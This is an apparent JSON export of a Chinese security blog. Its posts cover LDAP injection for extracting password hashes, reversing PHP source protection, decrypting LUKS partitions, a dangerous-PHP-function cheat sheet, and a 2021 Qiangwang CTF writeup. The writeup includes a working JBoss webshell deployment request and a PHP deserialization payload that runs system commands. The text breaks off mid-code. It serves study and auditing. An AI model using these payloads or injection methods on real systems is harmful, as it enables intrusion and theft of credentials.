{"meta":{"title":"白帽酱の博客","subtitle":"","description":"","author":"白帽酱","url":"https://rce.moe","root":"/"},"posts":[{"tags":[],"title":"记一次src测试中的ldap注入深入利用","date":"2022/01/25","text":"前言在最近的一次的src测试中遇到了ldap注入漏洞,目标是一个管理平台的单点登陆入口,漏洞存在于用户名存在判断处.之前渗透测试的时候我也遇到过几个生产环境中ldap注入的漏洞,但是都只能获取到有限的敏感信息(用户名 手机号 邮箱) 危害程度与ldap匿名绑定相同.在研究ldap查询语法时,我找到了一种可以外带ldap储存的用户密码的方法,实现了对ldap注入的进一步利用. ldap注入点判断ldap注入是指ldap过滤器语句(filter)的注入ldap过滤器的基本语法如下 =&gt;=&lt;=| 或&amp; 与! 非* 通配符(语句) 例如一个简单的查询语句如下 (cn=admin) 搜索cn值属性为admin的条目 成功会返回完整条目属性实际使用时可能会比较复杂比如说同时搜索匹配用户输入的用户名/邮箱/手机号 (|(cn=admin)(mail=admin)(mobile=admin)) ldap条目常见的属性值 cn (Common Name 通用名称) 常被用做用户名Surname 姓mobile 手机号mail 邮箱 在判断注入点的时候可以插入半个括号多余的未闭合的括号会使ldap查询出错 观察返回是否出现异常 即可判断注入点也可以直接输入*(星号) 通配符观察返回是否为用户存在但密码错误 或者是服务器错误(ldap查询可以同时返回多条结果 如果查询结果不唯一 后端未做好处理可能会报错)ldap注入常见于在判断用户名是否存在的点 很少出现在用户名密码同时判断的地方经过盲测发现目标可能的登陆逻辑如下 $ds=ldap_connect($ldapSrv,$port);//建立ldap连接if($ds) { $r=ldap_bind($ds, \"cn=\".$username.\",\".$dn, $passwd);/绑定ldap区域(相当于登陆ldap服务器) 使用域管用户登陆 检索用户列表 if($r) { $sr=ldap_search($ds, $dn, \"(user=\".$_GET[\"user\"].\")\");//在ldap中使用过滤器搜索用户名 $info = ldap_get_entries($ds, $sr); if($info[\"count\"]==0){ die('用户不存在'); } ldap_close($ds); $ds=ldap_connect($ldapSrv,$port);//建立ldap连接 $bd = ldap_bind($conn, $_GET[\"user\"], $passwd); // 绑定ldap区域(相当于登陆ldap服务器) 以普通用户登陆 判断是否登陆成功 if ($bd) { echo '登陆成功'; } else { echo '密码错误'; } ldap_close($ds); } else { echo \"Unable to connect to LDAP server.\"; } } ​ ldap的注入简单利用ldap通常构造通配符查询 控制返回的结果实现布尔注入从而带出ldap中储存的数据比如ldap中存在一个admin的用户名 查询的注入点为cn那么可以使用*匹配先猜测出用户名(cn=a*) 返回密码错误(cn=b*) 返回用户名不存在只要判断为密码错误即为匹配成功 构造脚本递归匹配字符(cn=a*)(cn=ad*)(cn=adm*)(cn=admi*)(cn=admin*)当然*也可以插在开头和中间或者是单独使用(cn=a*n)(cn=*n)(cn=*) 构造语句猜测admin用户的手机号(cn=admin)(mobile=13*)到这里已经可以跑出ldap中保存的一些敏感信息(手机号 邮箱 用户名)那么对ldap注入的利用只能到这了吗? 获取ldap中的密码作为用于用户认证鉴权场景的ldap服务,当然是要拿到ldap中储存的用户的密码查阅ldap文档 ldap的密码储存在userPassword属性尝试构造查询(cn=admin)(userPassword=a*)多次尝试发现都无法匹配记录.但是直接使用*可以匹配成功既然密码是一个属性为什么使用*号不能匹配部分字符串呢?经过查阅ldap rfc4519文档 发现userPassword属性类型不是常规的字符串,而是(Octet String 字节序列)*通配符只能匹配字符串那么怎么匹配字节序列呢通过阅读ldapwiki发现过滤器除了可以使用常规的运算符外,还有一种特殊的匹配规则(MatchingRule)其中有两个专门匹配Octet String的规则octetStringMatchoctetStringOrderingMatch第一个规则在完全匹配时才会返回真,这显然不能利用.在 rfc4517 找到了octetStringOrderingMatch规则的详细介绍 The rule evaluates to TRUE if and only if the attribute value appearsearlier in the collation order than the assertion value. The rulecompares octet strings from the first octet to the last octet, andfrom the most significant bit to the least significant bit within theoctet. The first occurrence of a different bit determines theordering of the strings. A zero bit precedes a one bit. If thestrings contain different numbers of octets but the longer string isidentical to the shorter string up to the length of the shorterstring, then the shorter string precedes the longer string. 逐字节比较两字节之间的大小 后者大于前者就返回真 显然这个规则可以用于注入使用 十六进制转义\\xx匹配单个字节 (ldap过滤器的语法之一) …. …. 用户名错误(cn=admin)(userPassword:2.5.13.18:=\\7b) 用户名错误(cn=admin)(userPassword:2.5.13.18:=\\7c) 密码错误 第一个字节为7b 继续尝试 …. …. 用户名错误(cn=admin)(userPassword:2.5.13.18:=\\7b\\4d) 用户名错误(cn=admin)(userPassword:2.5.13.18:=\\7b\\4e) 密码错误 第二个字节为4d 继续尝试 …. ….注意要将匹配到的每个字节-1再进行下一个匹配最后直接转为字符串得到密码最后成功跑出了目标账号的密码 ldap密码格式新版本ldap的密码很少有明文储存 基本上都是哈希后的密码哈希格式为 {哈希类型}base64后的值ldap有四种常见哈希{SHA}(SHA1)(SSHA) 加盐 SHA1{MD5} MD5{SMD5} 加盐MD5带盐的hsah储存格式为 加盐hash值+盐值将base64解码出的hash部分转换为十六进制字符串就可以使用hashcat进行常规的hash猜测了 修复方法转义可能会改变ldap过滤器语法的字符LDAP注入与防御剖析 function ldapspecialchars($string) { $sanitized=array('\\\\' =&gt; '\\5c', '*' =&gt; '\\2a', '(' =&gt; '\\28', ')' =&gt; '\\29', \"\\x00\" =&gt; '\\00'); return str_replace(array_keys($sanitized),array_values($sanitized),$string);}","permalink":"https://rce.moe/2022/01/25/ldap-inject-1/","photos":[]},{"tags":[],"title":"浅谈PHP源代码保护方案&受保护PHP代码の解密还原","date":"2021/12/28","text":"前言php是一种解释型脚本语言.与编译型语言不同,php源代码不是直接翻译成机器语言.而是翻译成中间代码(OPCODE) ,再由解释器(ZEND引擎)对中间代码进行解释运行 .​ 在php源代码的保护在原理可以分为3大类. 源代码混淆(编码) OPCODE混淆(编码) 修改解释引擎(虚拟机) 在部署上可以分为2大类. 无扩展 有扩展 下面分析下各种加密方案的实现方法 PHP 加密方案分析无扩展方案源代码混淆无扩展的加密在一些小开发者比较常见。这种源代码保护方式侵入性小，无需对服务器做额外的配置，兼容性较强。​ 这种情况混淆后的源代码还原非常简单，可完全还原出源代码。 有时连注释都会保留 (x 我觉得这种混淆都不能称之为加密基本流程 压缩代码-&gt;混淆变量函数类名-&gt;使用简单函数和方法进行编码加密 例:base64 异或 手工解密看到这种的php不要慌 这种处理后的文件 解密流程的变量和函数名使用了大量的非打印字符 按照正常的流程就可以ctrl+alt+l 快捷键 格式化代码 (这里使用的PhpStorm 其他IDE 格式化遇到特殊符号可能出问题 这里提前调整好了文件编码)这里有一个php的特性 php中的base64遇到非base64表中字符会直接忽略 不会影响解码注: PHP7 遇到空字符可能会抛出error 可以使用php5.6执行 (这里有一个兼容性问题 )遇到这种加密最简单的方法就是找文件中最后一步执行的函数 直接把内容打印出来这种编码方法最后一步肯定要使用eval执行还原后的php代码 所以打印最后一个函数基本上php代码就会全部出来 (x 前面操作一大顿毫无卵用注: 有保护方案也使用了call_user_func或call_user_func_array间接调用eval成功还原源代码 自动化通用解密PHP提供了强大的扩展功能 可以直接通过编写php扩展hook eval相关函数 获取执行的源代码HOOK php zend引擎的 zend_compile_string zend_include_or_eval 函数达到目的这里演示的是 hook zend_compile_string 函数 /* $Id$ */#include \"php.h\"#include \"ext/standard/info.h\"static zend_op_array* (*old_compile_string)(zval *source_string, char *filename TSRMLS_DC);static zend_op_array* evalhook_compile_string(zval *source_string, char *filename TSRMLS_DC){ if(strstr(filename, \"eval()'d code\")) { printf(\"\\n------eval-------\\n%s\\n------eval-------\\n\",Z_STRVAL_P(source_string)); } return old_compile_string(source_string, filename TSRMLS_CC);}PHP_MINIT_FUNCTION(evalhook){ return SUCCESS;}PHP_MSHUTDOWN_FUNCTION(evalhook){ return SUCCESS;}PHP_RINIT_FUNCTION(evalhook){ old_compile_string = zend_compile_string; zend_compile_string = evalhook_compile_string; return SUCCESS;}PHP_RSHUTDOWN_FUNCTION(evalhook){ zend_compile_string = old_compile_string; return SUCCESS;}PHP_MINFO_FUNCTION(evalhook){ php_info_print_table_start(); php_info_print_table_row(2, \"eval hooking\", \"enabled\"); php_info_print_table_end();}zend_function_entry evalhook_functions[] = { ZEND_FE_END};zend_module_entry evalhook_module_entry = { STANDARD_MODULE_HEADER, \"evalhook\", evalhook_functions, PHP_MINIT(evalhook), PHP_MSHUTDOWN(evalhook), PHP_RINIT(evalhook), PHP_RSHUTDOWN(evalhook), PHP_MINFO(evalhook), \"0.0.1-dev\", STANDARD_MODULE_PROPERTIES};ZEND_GET_MODULE(evalhook) 成功还原源代码 PHP扩展方案源代码混淆使用php扩展的代码混淆和无扩展代码混淆比较相似，只不过是把代码还原过程从php代码转到了php扩展。同样是使用aes des 异或等加密方法直接加密php代码，HOOK翻译php的函数在翻译PHP文件前对文件进行解密操作。这种方案也可以完全还原出源代码。在无其他混淆和压缩时甚至还会保留注释。典型开源项目：php-beast tonyenc screw-plus​ 手工解密这里以beast为例.首先在php的扩展目录下找到beast.sobeast的加密方案会把加密key编译进扩展中. 我们只需要寻找key就可以完成解密beast由于是开源项目.有现成的符号表和源码这使得反编译寻找key变得非常简单.但这样有点太简单了. 所以这里演示的是在没有源码的情况下使用IDA分析解密流程.首先在导入表找到zend_compile_file这个函数会将php文件翻译成opcode因此大部分php加密扩展都需要hook这个函数达到拦截php文件载入和替换php文件的功能继续跟入发现有两个函数一般在这种php加密扩展设计时会对这个函数有两次操作：一个是在启动时hook 这个函数，一个是在停止时恢复这个函数。继续跟入启动hook显然文件处理逻辑在cgi_compile_file内跟踪文件句柄decrypt_file函数的参数存在文件句柄 所以这个函数应该就是文件解密函数根据代码可以看出beast 加密文件的结构| encrypt_file_header_sign 文件头标记（不固定 可修改）| reallen文件长度 int 4字节 | expire 到期时间 int 4字节| entype 加密方式 int 4字节| 加密后文件|分析文件头发现该文件加密方式为 02跟入beast_get_encrypt_algo2对应的是 aes_handler_ops使用了AES 128 ECB加密模式直接提取key参数内容长度刚好16位到这一步就成功拿到了加密秘钥使用拿到的KEY就可以解密PHP文件​ 自动化通用解密编写php扩展 HOOK zend_compile_file函数beast的加密不会对php文件做额外的操作 解密文件与加密前原文件完全一致php注释和原格式都会保留注意: 这里扩展加载顺序问题 建议直接修改php源码Zendzend_language_scanner.cZEND_API zend_op_array *compile_file opcodephp会将源代码翻译成类似汇编的二进制中间操作码再交给zend引擎执行。之前的介绍的都是编译之前对php源代码的直接操作。这里是对opcode的操作，跳过翻译过程，直接把现成的opcode交给zend引擎执行(不同版本PHP引擎编译出的opcode可能会有兼容性问题)。这种php代码防护方法 只能hook zend_execute 拿到opcode。 不可能直接得到原本的源码，只能通过反编译尽可能的还原源代码。大部分商业php保护方案都使用这种可靠的方案为基础 _ZendGuard(zend) _SourceGuardian(SG) IonCube (IC) Swoole Compiler上面的方案有的还对zend引擎进行了魔改，使翻译出的opcode只能在修改后的引擎执行,进一步增强了安全性。 还原代码hook zend_execute 拿到opcode使用对应版本的php操作码反推php代码太菜了不会反编译) 附录PHP扩展编译​ ​ docker run -it --rm -v /mnt/hgfs/tmpssd/php-eval-hook/:/ext/ php:5.6 /bin/bashapt-get update apt install libtool phpize phpize 生成Makefile ./configure --enable-evalhook 配置编译选项 启用扩展​ 最后执行make 编译扩展编译好的扩展会放在./modules/ 目录下使用扩展 php -d extension=扩展位置 -f 文件 可以重复使用-d extension 加载多个扩展 ​ 总结在选用PHP源码保护方案时 尽量选择opcode或虚拟机方案源代码混淆类只能对源代码获取和阅读增加一点困难 在加密扩展可被攻击者获取到时并不能起到保护作用PHP代码审计入门指南 参考 php内核剖析​从Zend虚拟机分析PHP加密扩展通用加密php文件还原方法","permalink":"https://rce.moe/2021/12/28/phpydmbh/","photos":[]},{"tags":[],"title":"记一次审计时遇到的加密分区解密","date":"2021/12/28","text":"前言​ 最近拿到了一个商业产品的qcow2 镜像 准备试一试代码审计首先用qemu-img 转换成vmdk 镜像 qemu-img convert -f qcow2 123.qcow2 vmdk 123.vmdk 转换遇到错误 网上搜索只有一个其他项目的issue 没有解决方案阅读qemu源代码 发现是在2017-02-15版本引入了这个特性https://lists.gnu.org/archive/html/qemu-devel/2017-02/msg03173.html bitmaps_ext: Invalid extension length: Unknown error 发现可以使用2016年的旧版qemu完成转换https://qemu.weilnetz.de/w64/2016/转换完成使用vm启动 准备进入grub修改root密码发现grub使用密码验证​ 准备使用diskgenius载入镜像删除grub密码载入镜像后如下图所示除引导分区外 其他分区的文件系统不能正常识别​ 文件系统分析ci 是一个 LINUX LVM的卷组通过前缀魔数判断root卷文件系统为 XFSdiskgenius 不支持XFS文件系统 所以只能使用其他方法挂载读写里面的内容继续看其他分区 发现app home 分区与其他分区文件系统不一样有着LUKS的标记经过搜索发现这是一种LINUX上的硬盘加密方案 Linux Unified Key Setup使用了AES加密 需要秘钥才能解密既然可以正常进入系统,那就说明秘钥是储存在本地的.我们只要寻找系统分区的挂载配置就有可能找到秘钥. 文件系统解密准备一台可以正常使用的linux虚拟机. 这里使用了一台 kali将要挂载的硬盘添加到虚拟机中首先挂载 LINUX LVM卷组vgscan 扫描卷组vgchange -ay 卷标签 (激活卷组)成功挂载卷因为root分区没有加密所以直接挂载他新建一个目录 挂载root分区mount -t xfs /dev/mapper/cl-root /tmp/temfs/成功挂载root分区现在可以直接对root分区进行读写操作了 可以修改密码直接进入系统读取解密后分区的文件但是不能止步于此 既然遇到了这种特殊情况 就要学习下解密luks分区在查了一些资料后 发现解密方法非常简单第一步先在root分区寻找分区挂载的配置文件 /etc/fstab 启动分区挂载/etc/crypttab 分区解密 可以在/etc/crypttab 文件中找到用于分区解密的key文件位置 安装luks命令工具使用命令行解密分区 cryptsetup luksOpen 被加密的分区 --key-file 秘钥文件cryptsetup luksOpen /dev/mapper/cl-app --key-file /tmp/temfs/etc/.appconf/.abcde app 成功解密分区将这个mapper挂载到一个目录mkdir /tmp/atrustapp/mount -t xfs /dev/mapper/app /tmp/atrustapp/到这一步就完成了解密其他分区可按照这种方法使用对应秘钥单独解密","permalink":"https://rce.moe/2021/12/28/jycjmfqjm/","photos":[]},{"tags":[{"name":"笔记","slug":"笔记","permalink":"https://rce.moe/tags/%E7%AC%94%E8%AE%B0/"}],"title":"《PHP代码审计入门指南》","date":"2021/12/02","text":"这本指南包含了我在学习PHP代码审计过程中整理出的一些技巧和对漏洞的一些理解 https://github.com/burpheart/PHPAuditGuideBook https://cz0.gitbook.io/phpauditguidebook/","permalink":"https://rce.moe/2021/12/02/shenjizhinan/","photos":[]},{"tags":[{"name":"笔记","slug":"笔记","permalink":"https://rce.moe/tags/%E7%AC%94%E8%AE%B0/"},{"name":"PHP","slug":"PHP","permalink":"https://rce.moe/tags/PHP/"}],"title":"PHP代码审计入门基础-PHP敏感函数速查表","date":"2021/10/27","text":"PHP敏感函数速查表最近正在写一篇PHP代码审计的入门指南文档. 如果表格内出现遗漏或错误,欢迎大家私信反馈. PHP一些容易出现安全问题的函数方法命令执行一些常见的可以执行系统命令的函数/语法 函数/语法 描述 例子 system 执行命令并输出结果 system(‘id’); exec 执行命令 只可获取最后一行结果 exec(‘id’,$a); print_r($a); passthru 同 system passthru(‘id’); shell_exec ` (反引号) 执行命令并返回结果 $a=shell_exec(‘id’);print_r($a); $a=`id`;print_r($a); popen 执行命令并建立管道 返回一个指针 使用fread等函数操作指针进行读写 $a=popen(“id”, “r”); echo fread($a, 2096); proc_open 同 popen (进程控制功能更强大) 见PHP手册 pcntl_exec 执行命令 只返回是否发生错误 pcntl_exec(‘id’); 代码注入/文件包含 函数/语法结构 描述 例子 eval 将传入的参数内容作为PHP代码执行 eval 不是函数 是一种语法结构 不能当做函数动态调用 eval(‘phpinfo();’); assert 将传入的参数内容作为PHP代码执行 版本在PHP7以下是函数 PHP7及以上为语法结构 assert(‘phpinfo();’); preg_replace 当preg_replace使用/e修饰符且原字符串可控时时 有可能执行php代码 echo preg_replace(“/e”,”{${PHPINFO()}}”,”123”); call_user_func 把第一个参数作为回调函数调用 需要两个参数都完全可控才可利用 只能传入一个参数调用 call_user_func(‘assert’, ‘phpinfo();’); call_user_func_array 同call_user_func 可传入一个数组带入多个参数调用函数 call_user_func_array (‘file_put_contents’, [‘1.txt’,’6666’]); create_function 根据传递的参数创建匿名函数，并为其返回唯一名称 利用需要第二个参数可控 且创建的函数被执行 $f = create_function(‘’,’system($_GET[123]);’); $f(); include 包含并运行指定文件 执行出错会抛出错误 include ‘vars.php’; (括号可有可无) require 同include 执行出错会抛出警告 require(‘somefile.php’); (括号可有可无) require_once 同require 但会检查之前是否已经包含该文件 确保不重复包含 include_once 同include 但会检查之前是否已经包含该文件 确保不重复包含 SQL/LDAP注入 函数/方法 备注 mysql_query odbc_exec mysqli_query mysql_db_query mysql_unbuffered_query mysqli::query用法$mysqli = new mysqli(“localhost”, “my_user”, “my_password”, “world”);$mysqli-&gt;query(); pg_query pg_query_params pg_send_query pg_send_query_params sqlsrv_query pdo::query$pdo=new PDO(“mysql:host=localhost;dbname=phpdemo”,”root”,”1234”); $pdo-&gt;query($sql);; PDO SQLite3::querySQLite3::exec$db = new SQLite3(‘mysqlitedb.db’); $db-&gt;query(‘SELECT bar FROM foo’); $db-&gt;exec(‘CREATE TABLE bar (bar STRING)’); $mongo = new mongoclient(); $data = $coll-&gt;find($data); https://wooyun.js.org/drops/Mongodb%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB.html $ld = ldap_connect(“localhost”);…. $lb = @ldap_bind($ld, “cn=test,dc=test,dc=com”, “test”); https://www.cnblogs.com/0nc3/p/12063436.html Db::query Thinkphp Db::execute Thinkphp 文件读取/SSRF 函数 描述 例子 file_get_contents 读入文件返回字符串 echo file_get_contents(“flag.txt”); echo file_get_contents(“https://www.bilibili.com/\"); curl_setopt curl_exec Curl访问url获取信息 function curl($url){ $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_exec($ch); curl_close($ch); } $url = $_GET[‘url’]; curl($url); https://www.php.net/manual/zh/function.curl-exec.php fsockopen 打开一个套接字连接(远程 tcp/udp raw) https://www.php.net/manual/zh/function.fsockopen.php readfile 读取一个文件，并写入到输出缓冲 同file_get_contents fopen/fread/fgets/fgetss /fgetc/fgetcsv/fpassthru/fscanf 打开文件或者 URL 读取文件流 $file = fopen(“test.txt”,”r”); echo fread($file,”1234”); fclose($file); file 把整个文件读入一个数组中 echo implode(‘’, file(‘https://www.bilibili.com/')); highlight_file/show_source 语法高亮一个文件 highlight_file(“1.php”); parse_ini_file 读取并解析一个ini配置文件 print_r(parse_ini_file(‘1.ini’)); simplexml_load_file 读取文件作为XML文档解析 文件上传/写入/其他 函数 描述 例子 file_put_contents 将一个字符串写入文件 file_put_contents(“1.txt”,”6666”); move_uploaded_file 将上传的临时文件移动到新的位置 move_uploaded_file($_FILES[“pictures”][“tmp_name”],”1.php”) rename 重命名文件/目录 rename($oldname, $newname); rmdir 删除目录 mkdir 创建目录 unlink 删除文件 copy 复制文件 copy($file, $newfile); fopen/fputs/fwrite 打开文件或者 URL https://www.php.net/manual/zh/function.fwrite.php link 创建文件硬链接 link($target, $link); symlink 创建符号链接(软链接) symlink($target, $link); tmpfile 创建一个临时文件 (在临时目录存放 随机文件名 返回句柄) $temp = tmpfile(); fwrite($temp, “123456”); fclose($temp); request()-&gt;file()-&gt;move()request()-&gt;file()-&gt;file() Thinkphp 文件上传 $file = request()-&gt;file($name);$file-&gt;move($filepath); extractTo 解压ZIP到目录 DOMDocument loadXML simplexml_import_dom 加载解析XML 有可能存在XXEE 漏洞 file_get_contents获取客户端输入内容 new DOMDocument()初始化XML解析器 loadXML($xmlfile)加载客户端输入的XML内容 simplexml_import_dom($dom)获取XML文档节点，如果成功则返回SimpleXMLElement对象，如果失败则返回FALSE。 &lt;?php $xmlfile=file_get_contents(‘php://input’); $dom=new DOMDocument(); $dom-&gt;loadXML($xmlfile); $xml=simplexml_import_dom($dom); $xxe=$xml-&gt;xxe; $str=”$xxe \\n”; echo $str; ?&gt; 来自 &lt;_https://xz.aliyun.com/t/6887_&gt; simplexml_load_string 加载解析XML字符串 有可能存在XXE 漏洞 $xml=simplexml_load_string($_REQUEST[‘xml’]); print_r($xml); simplexml_load_file 读取文件作为XML文档解析 有可能存在XXE 漏洞 unserialize 反序列化","permalink":"https://rce.moe/2021/10/27/PHPsuchabiao/","photos":[]},{"tags":[{"name":"CTF","slug":"CTF","permalink":"https://rce.moe/tags/CTF/"},{"name":"WRITEUP","slug":"WRITEUP","permalink":"https://rce.moe/tags/WRITEUP/"},{"name":"强网杯","slug":"强网杯","permalink":"https://rce.moe/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"}],"title":"第五届强网杯全国网络安全挑战赛WEB-部分writeup-强网杯2021","date":"2021/06/14","text":"EASYWEB 控制台查看网络请求发现flies 访问47.104.137.239/files/c09358adff2ebfff2ef9b4fbacc4ac0b 下载hint.txt 拿到提示 Try to scan 35000-40000 ^_^.All tables are empty except for the table where the username and password are locatedTable: employee 根据提示通过端口扫描发现36842端口开放username存在sql注入 POST /account/login HTTP/1.1Host: 47.104.137.239:36842User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 35DNT: 1Connection: closeReferer: http://121.42.242.238:36842/account/loginCookie: ci_session=bo397pc9n0pd318uetdbl1r5rh33u3jbUpgrade-Insecure-Requests: 1username=admin*&amp;password=admin 拿到登陆账号密码admin 99f609527226e076d668668582ac4420登陆后台后台没有可以利用的地方 继续扫描目录 发现文件上传路由构造文件名绕过限制上传php文件 由于权限太低无法getflag (只有owner有权限 flag权限应该是0440) 需要root用户组继续查看监听端口发现有其他服务 通过上传的小马写入新的phpshell通过shell搭建隧道 访问web服务 发现是一个存在jmx-console未授权访问的jboss /jmx-console/HtmlAdaptor?action=invokeOpByName&amp;name=jboss.admin%3Aservice%3DDeploymentFileRepository&amp;methodName=store&amp;argType=java.lang.String&amp;arg0=August.war&amp;argType=java.lang.String&amp;&amp;arg1=shell1&amp;argType=java.lang.String&amp;arg2=.jsp&amp;argType=java.lang.String&amp;arg3=&lt;%25 if(\"023\".equals(request.getParameter(\"pwd\"))){java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print(\"&lt;pre&gt;\");while((a=in.read(b))!=-1){out.println(new String(b));}out.print(\"&lt;/pre&gt;\");}%25&gt;&amp;argType=boolean&amp;arg4=True 写入一句话shell 成功getflag pop_master该题需要构造反序列化利用链 最终实现RCE由于该题目类数量巨大1W个 编写自动化脚本构造pop链 第一步将class.php.txt转化成AST(抽象语法树) 保存为json格式&lt;?phpini_set(“memory_limit”,”-1”);echo(json_encode(ast\\parse_file(“class.php”, $version=70)));构造比较简单A-&gt;B-&gt;C-&gt;…….-&gt;包含EVAL()的class function调用这里有几个坑 1.调用途中有参数污染(附加垃圾数据) 2.调用途中传参可能被清空 (传参被赋值未定义的变量)3.调用途中传参可能被修改 (直接赋值为垃圾数据)所以并不是找到调用链就可以完成工作 而是需要找到可以利用的调用链 自动化代码:PS:没有什么参考价值 只对该题可用 因为固定3种函数结构所以偷懒把参数写死了 初学py语言 第一次做AST树解析用这种笨方法) ## -*- coding: utf-8 -*-import jsonimport randomimport osimport stringwith open(\"12.json\") as f: line=f.readline() result=json.loads(line)print(len(result['children']))def asb(name,s,s1=''): ee = 0 for a in result['children']: for b in a['children']['stmts']['children']: if 'name' in b['children'].keys(): if (b['children']['name'] == 'gG1T5D'): ee = 0 #ee=1 if (b['children']['name'] == name): test(a) if(len(b['children']['stmts']['children'])==3): q = b['children']['stmts']['children'][1]['children'][0]['children']['cond']['children']['args']['children'][1] w = b['children']['stmts']['children'][random.randint(1,2)]['children'][0]['children']['cond']['children']['args']['children'][1]#随机分支 玄学构造 #print(s + q) #print(s + w) ran_str = ''.join(random.sample(string.ascii_letters, 8)) print('$'+ran_str+'=new '+a['children']['name']+'();') s11='$' + ran_str + '-&gt;' + a['children']['stmts']['children'][0]['children']['props']['children'][0]['children']['name'] + '=' #if s1!='': # asb(w, s +w+'--&gt;') # asb(q, s +q+'--&gt;') if ee!=1: asb(w,s,s11)# 分支函数1 #asb(q, s, s11)# 分支函数2 if ran_str == '': exit() print(s1 + '$' + ran_str+';') #asb(q, s +q+'--&gt;') else: if 'method' in b['children']['stmts']['children'][1]['children'].keys():# 没有分支 q = b['children']['stmts']['children'][1]['children']['method'] ran_str = ''.join(random.sample(string.ascii_letters, 8)) print('$' + ran_str + '=new ' + a['children']['name'] + '();') s11 = '$' + ran_str + '-&gt;' + a['children']['stmts']['children'][0]['children']['props']['children'][0]['children']['name'] + '=' #print(s + q) if ee != 1: asb(q, s, s11) if ran_str == '': exit() print(s1 + '$' + ran_str + ';')def test(d): #if name in {'Name','COiLxB'}: #print('nono') #exit() try: a=d['children']['stmts']['children'][1]['children']['params']['children'][0]['children']['name'] b=d['children']['stmts']['children'][1]['children']['stmts']['children'][0]['children']['stmts']['children'][0]['children']['var']['children']['name'] c=d['children']['stmts']['children'][1]['children']['stmts']['children'][0]['children']['stmts']['children'][0]['children']['expr']['children']['name'] if(a==b and b!=c and a!='DgiNa'): #判断赋值是否是用不存在的变量覆盖传参 print(a,b,c) print('no') asb('YYdqkf', 'YYdqkf' + '--&gt;')#重新搜索 os._exit(0) except: passasb('YYdqkf','YYdqkf'+'--&gt;') 编写脚本处理AST随机抽取一条构造链 检验是否正常执行(传参修改检测) 反复抽取得到可用的链ps:例图输出与下面代码无关 找不到成功的图了 &lt;?php此处省略3M大小的源class$a=new WK4tcG();$prXsQMfO=new WK4tcG();$DLcTtAga=new xaeGnG();$lcbgRpGI=new oAMzcx();$IatldcbW=new p38LCI();$nULgbaKw=new GbfW4c();$ASyQaYMV=new m2s3zO();$GMwztlCS=new PgSSqR();$MegPsOnX=new RLuIRL();$neJOwgfu=new WykBAC();$PNHChDce=new g6hgDh();$BzceWjKp=new HDaeRV();$YThMXwcb=new bREm3w();$xWVjhwmO=new D0aZh5();$BIbCvgZD=new T9NX4U();$prvhXPMW=new eWciOL();$NVHbgdzD=new TqWDlm();$mszgihWC=new XoFA87();$vDBkPwqO=new MU1ai5();$ZYHhsIid=new eHtdBF();$ZYHhsIid-&gt;V7XKdgi=new DNUWgV();$vDBkPwqO-&gt;zXEmp6T=$ZYHhsIid;$mszgihWC-&gt;z35pfqP=$vDBkPwqO;$NVHbgdzD-&gt;KGgGFnb=$mszgihWC;$prvhXPMW-&gt;D6qeYVK=$NVHbgdzD;$BIbCvgZD-&gt;UwQCEH2=$prvhXPMW;$xWVjhwmO-&gt;ST8sCZq=$BIbCvgZD;$YThMXwcb-&gt;pMgtiwK=$xWVjhwmO;$BzceWjKp-&gt;OO72gIu=$YThMXwcb;$PNHChDce-&gt;GYBlHLq=$BzceWjKp;$neJOwgfu-&gt;yWYNYcP=$PNHChDce;$MegPsOnX-&gt;dFy0Irz=$neJOwgfu;$GMwztlCS-&gt;Cs99EPC=$MegPsOnX;$ASyQaYMV-&gt;QidIkAq=$GMwztlCS;$nULgbaKw-&gt;gE4DrP9=$ASyQaYMV;$IatldcbW-&gt;OksedLV=$nULgbaKw;$lcbgRpGI-&gt;SUxaKsh=$IatldcbW;$DLcTtAga-&gt;u3832FP=$lcbgRpGI;$a-&gt;fBuH5Og=$DLcTtAga;//$a = $_GET['pop'];$b = $_GET['argv'];echo serialize($a);//$a = unserialize($a);//var_dump($a);$a-&gt;YYdqkf($b);?&gt; 生成序列化文本?pop=O:6:%22WK4tcG%22:1:{s:7:%22fBuH5Og%22;O:6:%22xaeGnG%22:1:{s:7:%22u3832FP%22;O:6:%22oAMzcx%22:1:{s:7:%22SUxaKsh%22;O:6:%22p38LCI%22:1:{s:7:%22OksedLV%22;O:6:%22GbfW4c%22:1:{s:7:%22gE4DrP9%22;O:6:%22m2s3zO%22:1:{s:7:%22QidIkAq%22;O:6:%22PgSSqR%22:1:{s:7:%22Cs99EPC%22;O:6:%22RLuIRL%22:1:{s:7:%22dFy0Irz%22;O:6:%22WykBAC%22:1:{s:7:%22yWYNYcP%22;O:6:%22g6hgDh%22:1:{s:7:%22GYBlHLq%22;O:6:%22HDaeRV%22:1:{s:7:%22OO72gIu%22;O:6:%22bREm3w%22:1:{s:7:%22pMgtiwK%22;O:6:%22D0aZh5%22:1:{s:7:%22ST8sCZq%22;O:6:%22T9NX4U%22:1:{s:7:%22UwQCEH2%22;O:6:%22eWciOL%22:1:{s:7:%22D6qeYVK%22;O:6:%22TqWDlm%22:1:{s:7:%22KGgGFnb%22;O:6:%22XoFA87%22:1:{s:7:%22z35pfqP%22;O:6:%22MU1ai5%22:1:{s:7:%22zXEmp6T%22;O:6:%22eHtdBF%22:1:{s:7:%22V7XKdgi%22;O:6:%22DNUWgV%22:1:{s:7:%22bieiHE3%22;N;}}}}}}}}}}}}}}}}}}}}&amp;argv=system(%27cat%20/flag%27);//访问即可getflag [强网先锋]寻宝需要两个KEY 来getflag KEY1 &lt;?phpheader('Content-type:text/html;charset=utf-8');highlight_file(__file__);function filter($string){ $filter_word = array('php','flag','index','KeY1lhv','source','key','eval','echo','\\$','\\(','\\.','num','html','\\/','\\,','\\'','0000000'); $filter_phrase= '/'.implode('|',$filter_word).'/'; return preg_replace($filter_phrase,'',$string); }if($ppp){ unset($ppp);}$ppp['number1'] = \"1\";$ppp['number2'] = \"1\";$ppp['nunber3'] = \"1\";$ppp['number4'] = '1';$ppp['number5'] = '1';extract($_POST);$num1 = filter($ppp['number1']); 